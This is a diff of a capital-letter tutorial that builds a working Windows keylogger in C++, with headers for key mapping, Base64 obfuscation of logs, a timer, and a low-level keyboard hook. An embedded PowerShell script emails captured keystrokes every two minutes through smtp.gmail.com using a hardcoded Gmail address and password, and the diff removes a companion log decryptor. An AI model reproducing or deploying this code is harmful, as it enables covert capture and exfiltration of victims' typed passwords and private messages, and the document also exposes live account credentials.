@@ -47,29 +47,28 @@ TO HAPPEN. IT'S JUST NOT GOING HAPPEN.
 KeyCONSTANTS:
 CREATE A HEADER FILE WITH THE NAME "KeyConstants.h".
 
-#ifndef KEYCONSTANTS_H
-#define KEYCONSTANTS_H
-#include <map>
-#include <string>
+	#ifndef KEYCONSTANTS_H
+	#define KEYCONSTANTS_H
+	#include <map>
+	#include <string>
 
-//vk = VIRTUAL KEY
-class KeyPair
-{
-    public:
-        KeyPair(const std::string &vk = "", const std::string &name = "") : VKName(vk), Name(name){}
-        std::string VKName;
-        std::string Name;
+	//vk = VIRTUAL KEY
+	class KeyPair
+	{
+    	public:
+        	KeyPair(const std::string &vk = "", const std::string &name = "") : VKName(vk), Name(name){}
+        	std::string VKName;
+        	std::string Name;
+	};
 
-};
+	class Keys
+	{
+    	public:
+        	static std::map<int, KeyPair> KEYS;
+	};
 
-class Keys
-{
-    public:
-        static std::map<int, KeyPair> KEYS;
-};
-
-map<int, KeyPair> Keys::KEYS = {
-    {0xC1, {"[VK_ABNT_C1]", "[Abnt C1]"}},
+	map<int, KeyPair> Keys::KEYS = {
+    	{0xC1, {"[VK_ABNT_C1]", "[Abnt C1]"}},
     {0xC2, {"[VK_ABNT_C2]", "[Abnt C2]"}},
     {0x6B, {"[VK_ADD]", "[Numpad +]"}},
     {0xF6, {"[VK_ATTN]", "[Attn]"}},
@@ -260,10 +259,10 @@ map<int, KeyPair> Keys::KEYS = {
     {0xAF, {"[VK_VOLUME_UP]", "[Volume Up]"}},
     {0x05, {"[VK_XBUTTON1]", "[X Button 1 **]"}},
     {0x06, {"[VK_XBUTTON2]", "[X Button 2 **]"}},
-};
+	};
 
 
-#endif // KEYCONSTANTS_H
+	#endif // KEYCONSTANTS_H
 
 THIS IS HOW THE SYSTEM REGISTER A KEYSTROKE.
 THE MAP HAS THE FOLLOWING SINTAX:
@@ -271,18 +270,18 @@ THE MAP HAS THE FOLLOWING SINTAX:
 
 NOW CREATE A HEADER AND NAME IT "Helper.h":
 
-#ifndef HELPER_H
-#define HELPER_H
+	#ifndef HELPER_H
+	#define HELPER_H
 
-#include <fstream>
-#include <ctime>
-#include <string>
-#include <sstream>
+	#include <fstream>
+	#include <ctime>
+	#include <string>
+	#include <sstream>
 
-namespace Helper
-{
-    template <class T>
-    std::string ToString (const T &);
+	namespace Helper
+	{
+    	template <class T>
+    	std::string ToString (const T &);
 
     struct DateTime
     { //START STRUCT
@@ -346,22 +345,22 @@ namespace Helper
             file << "[" << Helper::DateTime().GetDateTimeString () << "]" << "\n" << s << std::endl << "\n";
             file.close();
         }
-} //END NAMESPACE
-#endif
+	} //END NAMESPACE
+	#endif
 
 WE SHALL CREATE A HEADER WITCH WILL BE USED FOR ENCODING AND ENCRYPTING AS WELL. WE ARE GOING TO USE 
 BASE64, BASE64 IS NOT REALLY AN ENCRYPTION, IT'S AN ENCODING PROCEDURE. LET'S CREATE A HEADER AND
 NAME IT "Base64.h":
 
-#ifndef BASE_64_H
-#define BASE_64_H
+	#ifndef BASE_64_H
+	#define BASE_64_H
+	
+	#include <vector>
+	#include <string>
 
-#include <vector>
-#include <string>
-
-namespace Base64
-{
-    std::string base64_encode(const std::string &);
+	namespace Base64
+	{
+    	std::string base64_encode(const std::string &);
 
     const std::string &SALT1 = "LM::TM:BB";
     const std::string &SALT2 = "_:/_77";
@@ -407,31 +406,31 @@ namespace Base64
         while(ret.size()%4) ret.push_back('-');
 
         return ret;
-    }
+    	}
 
-}
+	}
 
 
-#endif // BASE_64_H
+	#endif // BASE_64_H
 
 
 IO HEADER: IN THIS HEADER WE STORE ALL THE FUNCTIONS FOR INPUT/OUTPUT OPERATIONS, LIKE CREATING FILES, READIING FROM
 THEM, FINDING PATHS, ETC.
 THEN, WE DO:
 
-#ifndef IO_H
-#define IO_H
+	#ifndef IO_H
+	#define IO_H
 
-#include <string>
-#include <cstdlib>
-#include <windows.h>
-#include <fstream>
+	#include <string>
+	#include <cstdlib>
+	#include <windows.h>
+	#include <fstream>
 
-#include "Helper.h"
-#include "Base64.h"
+	#include "Helper.h"
+	#include "Base64.h"
 
-namespace IO
-{
+	namespace IO
+	{
     //WE NEED A FUNCTION TO RETRIEVE OUR DESIGNATED FOLDER
     std::string GetOurPath (const bool append_separator = false)
     //IT JUST CHECKS IF THE BACKSLASH IS NEEDED IN HE END OF THE PATH
@@ -495,11 +494,10 @@ namespace IO
             return "";
         }
 
-    }
+    	}	
+	}//END NAMESPACE
 
-}//END NAMESPACE
-
-#endif // IO_H
+	#endif // IO_H
 
 
 TIME HEADER: CREATE A HEADER AND NAME IT "TimeHeader.h". 
@@ -516,22 +514,22 @@ THE DIFFERENCE BETWEEN A PROCESS AND A THREAD, IS THAT MULTIPLE THREADS CAN SHAR
 SECTIONS, IT USES THE SAME DYNAMIC LIBRARIES AND OPEN FILE DESCRIPTORS.
 LET'S START:
 
-#ifndef TIMER_H
-#define TIMER_H
+	#ifndef TIMER_H
+	#define TIMER_H
 
-#include <thread>
-#include <chrono>
+	#include <thread>
+	#include <chrono>
 
-class Timer
-{
-private:
-    std::thread Thread;
-    bool Alive = false;
-    long CallNumber = -1L;//HOW MANY TIMES WE WOULD TO CALL A CERTAIN FUNCTION
-    long repeat_count = -1L; //WE COUNT THE TIMES THAT A FUNCTIONS IS CALLED
-    std::chrono::milliseconds interval = std::chrono::milliseconds(0);
-    std::function<void(void)> funct = nullptr;
-    //THE FUNCTION ABOVE DOESN'T POINT TO ANY FUNCTION AT THE MOMENT
+	class Timer
+	{
+	private:
+    	std::thread Thread;
+    	bool Alive = false;
+    	long CallNumber = -1L;//HOW MANY TIMES WE WOULD TO CALL A CERTAIN FUNCTION
+    	long repeat_count = -1L; //WE COUNT THE TIMES THAT A FUNCTIONS IS CALLED
+    	std::chrono::milliseconds interval = std::chrono::milliseconds(0);
+    	std::function<void(void)> funct = nullptr;
+    	//THE FUNCTION ABOVE DOESN'T POINT TO ANY FUNCTION AT THE MOMENT
 
     void SleepAndRun()
     {
@@ -552,7 +550,7 @@ private:
         }
     }
 
-public:
+	public:
     static const long Infinite = -1L;
     Timer(){}
     Timer(const std::function<void(void)> &f):funct (f){}
@@ -601,18 +599,18 @@ public:
     unsigned long Interval() const {return interval.count();}
 
     const std::function<void(void)> &Function() const {return funct;}
-};
+	};
 
-#endif // TIMER_H
+	#endif // TIMER_H
 
-SENDMAIL: CREATE A HEADER AND NAME IT "". WE'RE GOING TO USE POWERSHELL SCRIPT. NOW, IN THE SEARCH ENGINE OF WINDOWS
+SENDMAIL: WE'RE GOING TO USE POWERSHELL SCRIPT. NOW, IN THE SEARCH ENGINE OF WINDOWS
 WRITE "Windows PowerShell ISE", ENTER IN THE PROGRAM AND CREATE A NEW FILE, WRITE THE FOLLOWING CODE:
 
-Param([String]$Att,[String]$Subj,[String]$Body)
+	Param([String]$Att,[String]$Subj,[String]$Body)
 
-Function Send-Email
-{
-    Param(
+	Function Send-Email
+	{
+    	Param(
             [Parameter(`
             Mandatory=$true)][String] $To,
             [Parameter(`
@@ -676,64 +674,64 @@ Function Send-Email
     {
         exit 4;
     }
-}
+	}
 
 NOW, WE HAVE TO TRANSLATE THIS INTO A FORMAT SUITABLE FOR A C++ STRING. CREATE A HEADER AND NAME IT "SendMail.h",
 NOW, LET'S START CODING:
 
-#ifndef SEND_MAIL_H
-#define SEND_MAIL_H
+	#ifndef SEND_MAIL_H
+	#define SEND_MAIL_H
 
-#include <fstream>
-#include <vector>
-#include <windows.h>
-#include "IO.h"
-#include "Timer.h"
-#include "Helper.h"
+	#include <fstream>
+	#include <vector>
+	#include <windows.h>
+	#include "IO.h"
+	#include "Timer.h"
+	#include "Helper.h"
 
-#define SCRIPT_NAME "sm.ps1"
+	#define SCRIPT_NAME "sm.ps1"
 
-namespace Mail
-{
+	namespace Mail
+	{
     #define X_EM_TO "jobs.at.kl@gmail.com"
     #define X_EM_FROM "jobs.at.kl@gmail.com"
     #define X_EM_PASS "Jobs.at.kl"
     const std::string &PowerShellScript =
-"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
-"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
-" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
-"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
-"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
-"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
-"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
-"  ForEach ($val in $Attachments)\r\n                    "
-"        {\r\n               "
-"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
-"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
-"}\r\n                catch\r\n                    {\r\n                        exit 2; "
-"\r\n                    }\r\n            }\r\n "
-"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
-"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
-"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
-"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
-"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
-"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
-"Send-EMail -attachment $Att "
-"-To \"" +
- std::string (X_EM_TO) +
- "\""
-" -Body $Body -Subject $Subj "
-"-password \"" +
- std::string (X_EM_PASS) +
-  "\""
-" -From \"" +
- std::string (X_EM_FROM) +
-"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
+	"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
+	"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
+	" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+	"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+	"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
+	"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+	"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+	"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
+	"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
+	"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
+	"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
+	"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
+	"  ForEach ($val in $Attachments)\r\n                    "
+	"        {\r\n               "
+	"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
+	"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
+	"}\r\n                catch\r\n                    {\r\n                        exit 2; "
+	"\r\n                    }\r\n            }\r\n "
+	"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
+	"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
+	"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
+	"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
+	"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
+	"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
+	"Send-EMail -attachment $Att "
+	"-To \"" +
+ 	std::string (X_EM_TO) +
+ 	"\""
+	" -Body $Body -Subject $Subj "
+	"-password \"" +
+ 	std::string (X_EM_PASS) +
+  	"\""
+	" -From \"" +
+ 	std::string (X_EM_FROM) +
+	"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
 
     #undef X_EM_FROM
     #undef X_EM_TO
@@ -826,9 +824,9 @@ namespace Mail
         }
         return SendMail(subject, body, attachments);
     }
-}
+	}
 
-#endif // SEND_MAIL_H
+    #endif // SEND_MAIL_H
 
 THAT'S ALL.
 
@@ -836,28 +834,28 @@ KeyBoardHook: THIS HEADER WILL BE THE ONE THAT IS IN CHARGE OF RECORDING ALL THE
 MOST IMPORTANT HEADER. WE WILL USE A SERIES OF WINDOWS API FUNCTIONS TO HOOK KEYBOARD EVENTS.
 LET'S START CODING:
 
-#ifndef KEYBHOOK_H
-#define KEYBHOOK_H
+	#ifndef KEYBHOOK_H
+	#define KEYBHOOK_H
 
-#include <iostream>
-#include <fstream>
-#include <windows.h>
+	#include <iostream>
+	#include <fstream>
+	#include <windows.h>
 
-#include "KeyConstants.h"
-#include "Timer.h"
-#include "SendMail.h"
+	#include "KeyConstants.h"
+	#include "Timer.h"
+	#include "SendMail.h"
 
-//THE FOLLOWING WOULD BE A VARIABLE WHERE ALL THE KEYY STROKES
-//ARE STORED, AFTER THE MAIL IS SEND, THE VARUABLE WILL BE CLEARED
-//BUT, IF THE SENDING OF THE MAIL DOESN'T SUCCEED,
-//THE CONTENT OF THE VARIABLE WON'T BE CLEARED
-std::string keylog="";
+	//THE FOLLOWING WOULD BE A VARIABLE WHERE ALL THE KEYY STROKES
+	//ARE STORED, AFTER THE MAIL IS SEND, THE VARUABLE WILL BE CLEARED
+	//BUT, IF THE SENDING OF THE MAIL DOESN'T SUCCEED,
+	//THE CONTENT OF THE VARIABLE WON'T BE CLEARED
+	std::string keylog="";
 
-//WE'RE GOING TO SEND EMAILS EACH 2 MINUTES
-void TimerSendMail()
-{
-    if(keylog.empty()) return;
-    std::string last_file=IO::WriteLog(keylog);
+	//WE'RE GOING TO SEND EMAILS EACH 2 MINUTES
+	void TimerSendMail()
+	{
+    	if(keylog.empty()) return;
+    	std::string last_file=IO::WriteLog(keylog);
 
     if(last_file.empty())
     {
@@ -871,14 +869,14 @@ void TimerSendMail()
     if(x!=7) Helper::WriteAppLog("MAIL WAS'N SENT! ERROR CODE: " + Helper::ToString(x));
     else keylog = "";
 
-}
+	}
 
-Timer MailTimer(TimerSendMail, 2000*60, Timer::Infinite);
+	Timer MailTimer(TimerSendMail, 2000*60, Timer::Infinite);
 
-HHOOK eHook = NULL;
+	HHOOK eHook = NULL;
 
-LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
-{
+	LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
+	{
     //IF WE RECEIVE nCode LESS THAN ZERO, THAT MEANS THAT WE MUST PROPAGATE THE HOOKS
     if(nCode<0) CallNextHookEx(eHook, nCode, wparam, lparam);
     //READ ABOUT THE FOLLOWING: KBDLLHOOKSTRUCT
@@ -908,48 +906,48 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
         }
     }
     return CallNextHookEx(eHook, nCode, wparam, lparam);
-}
+	}
 
-//"WH_KEYBOARD" INDICATES THAT WE USE KEYBOARD HOOK
-//AND "_LL" (SHORTHAND FOR LOW LEVEL) INDICATES THAT THIS IS A GLOBAL HOOK
-//THE VALUE OF THE CONSTANT IS 13
-bool InstallHook()
-{
+	//"WH_KEYBOARD" INDICATES THAT WE USE KEYBOARD HOOK
+	//AND "_LL" (SHORTHAND FOR LOW LEVEL) INDICATES THAT THIS IS A GLOBAL HOOK
+	//THE VALUE OF THE CONSTANT IS 13
+	bool InstallHook()
+	{
     Helper::WriteAppLog("Hook Started... Timer started");
     MailTimer.Start(true);
     eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
     return eHook==NULL;
-}
+	}
 
-bool UninstallHook()
-{
+	bool UninstallHook()
+	{
     BOOL b = UnhookWindowsHookEx(eHook);
     eHook = NULL;
     return (bool)b;
-}
+	}
 
-bool IsHooked()
-{
-    return (bool)(eHook==NULL);
-}
+	bool IsHooked()
+	{
+    	return (bool)(eHook==NULL);
+	}
 
-#endif // KEYBHOOK_H
+	#endif // KEYBHOOK_H
 
 FINALLY, THE "main" FUNCTION IS:
 
-#include <iostream>
-#include <windows.h>
-#include "Helper.h"
-#include "KeyConstants.h"
-#include "Base64.h"
-#include "Timer.h"
-#include "SendMail.h"
-#include "KeybHook.h"
+	#include <iostream>
+	#include <windows.h>
+	#include "Helper.h"
+	#include "KeyConstants.h"
+	#include "Base64.h"
+	#include "Timer.h"
+	#include "SendMail.h"
+	#include "KeybHook.h"
 
-using namespace std;
+	using namespace std;
 
-int main()
-{
+	int main()
+	{
     MSG Msg;
 
     IO::MKDir(IO::GetOurPath(true));
@@ -965,7 +963,7 @@ int main()
     MailTimer.Stop();
 
     return 0;
-}
+	}
 
 DEMO: WE'RE GOING TO USE GMAIL, SEARCH IN GOOGLE (WHEN YOU'RE LOGIN) "google less secure apps", OPEN UP THE FIRST 
 LINK THAT COMES. SCROLL DOWN AND CLICK ON "less secure apps section" AND CLICK ON "TURN ON". THAT'S IT.
@@ -973,75 +971,3 @@ GO TO THE FOLDER WHERE YOU SAVED THE PROJECT (OF THE KEYLOGGER, OBVIOUSLY) AND G
 ON "Keylogger". 
 NOW, START TO KEY, WAIT 2 MINUTES (OR YOU CAN EDIT THE CODE TO WAIT LESS), AND YOU WILL RECEIVE AN EMAIL WITH A
 BODY AND A FILE ATTACH. THAT'S ALL.
-
-IT'S POSSIBLE TO DECRYPT THE KEYLOGGER? YES! 
-
-DECRIPTION OF KEYLOGGER: THE CODE IS:
-#include <iostream>
-#include <fstream>
-#include <string>
-#include <vector>
-
-std::string DecryptB64 (std::string s);
-std::string base64_decode (const std::string &s);
-
-const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-const std::string &SALT1 = "LM::TB::BB";
-const std::string &SALT2 = "__:/__77";
-const std::string &SALT3 = "line=wowC++";
-
-int main(int argc, char *argv[])
-{
-    if(argc!=3) return std::cout<<"PROGRAM NEEDS TWO ARGUMENTS, I/O"<<std::endl, 2;
-    std::string in(argv[1]), out(argv[2]);
-    std::ifstream fi (in);
-    if(!fi) return std::cout<<"CANNOT READ INPUT FILE '"<<in<<"'"<<std::endl,3;
-    std::string data;
-    fi>>data;
-    if(!fi) return std::cout<<"INPUT FILE '"<<in<<"' CORRUPTED!"<<std::endl, 4;
-    data=DecryptB64(data);
-    std::ofstream fo (out);
-    if(!fo) return std::cout<<"CANNOT WRITE OUTPUT FILE '"<<out<<"'"<<std::endl, 5;
-    fo<<data;
-    std::cout<<"DECODING WAS SUCCESSFULL"<<std::endl;
-    return 0;
-}
-
-std::string DecryptB64 (std::string s)
-{
-    s = s.erase (7, 1);
-    s = s.erase (1, 1);
-    s = base64_decode (s);
-    s = s.substr (SALT2.length() + SALT3.length());
-    s = s.substr (0, s.length() - SALT1.length());
-    s = base64_decode (s);
-    s = s.substr (0, s.length() - SALT1.length());
-    s = s.erase (7, SALT3.length());
-    s = base64_decode (s);
-    s = s.substr (SALT1.length());
-    s = s.substr (0, s.length() - SALT2.length() - SALT3.length());
-    return s;
-}
-
-std::string base64_decode(const std::string &s)
-{
-    std::string ret;
-    std::vector<int> vec(256, -1);
-    for (int i = 0; i < 64; i++)
-        vec [BASE64_CODES[i]] = i;
-    int val = 0, bits = -8;
-    for (const auto &c : s)
-    {
-        if (vec[c] == -1) break;
-        val = (val << 6) + vec[c];
-        bits += 6;
-
-        if (bits >= 0)
-        {
-            ret.push_back(char((val >> bits) & 0xFF));
-            bits -= 8;
-        }
-    }
-
-    return ret;
-}
